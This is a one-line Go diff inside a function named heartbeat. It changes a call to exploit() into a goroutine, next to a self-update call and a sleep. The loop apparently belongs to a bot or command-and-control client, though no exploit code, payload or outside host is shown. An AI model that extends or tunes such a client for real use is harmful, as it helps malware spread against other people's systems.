@@ -77,7 +77,7 @@ func heartbeat() {
 				fmt.Println("Try to update")
 				go update.Replace()
 			} else {
-				exploit()
+				go exploit()
 			}
 		}
 		time.Sleep(time.Second * time.Duration(heartbeat_delay))
